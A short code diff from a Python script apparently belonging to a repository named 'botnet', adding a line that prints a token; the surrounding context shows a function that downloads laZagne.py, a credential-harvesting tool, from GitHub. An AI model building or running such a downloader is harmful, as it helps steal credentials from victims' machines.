@@ -4,6 +4,8 @@ import base64
 
 url = "https://api.github.com/repos/Pol-Ruiz/botnet/edit/main/laZagne.py"
 
+print(token)
+
 def downloadFile(url):
     print('[!] Descargando ' + url)
     sha = None
